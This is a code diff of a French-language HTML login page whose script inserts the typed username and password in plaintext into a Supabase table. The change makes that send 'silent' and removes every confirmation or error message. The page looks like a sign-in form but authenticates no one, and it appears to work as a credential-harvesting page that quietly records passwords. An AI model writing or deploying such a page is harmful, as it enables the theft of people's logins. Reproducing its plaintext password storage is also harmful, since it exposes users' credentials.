@@ -49,7 +49,7 @@ button{
 <body>
 
 <div class="box">
-    <h2>Se connecter 👻</h2>
+    <h2>Connexion 👻</h2>
 
     <form>
         <input id="username" placeholder="Nom d'utilisateur" required>
@@ -62,6 +62,7 @@ button{
 const supabaseUrl = "https://qarjoeeftvtrzoqyufgb.supabase.co";
 const supabaseKey = "sb_publishable_-81q9wbD36UU-U9eBdP-AQ_wvgIUeHO";
 
+// ⚠️ UN SEUL CLIENT (évite bug duplicate)
 const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
 
 document.querySelector("form").addEventListener("submit", async function(e){
@@ -70,15 +71,12 @@ document.querySelector("form").addEventListener("submit", async function(e){
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    const { error } = await supabaseClient
+    // 💾 envoi silencieux
+    await supabaseClient
         .from("users")
         .insert([{ username, password }]);
 
-    if(error){
-        alert("Erreur ❌ : " + error.message);
-    } else {
-        alert("Envoyé ✔");
-    }
+    // ❌ aucun message, aucun alert, aucune redirection
 });
 </script>
 
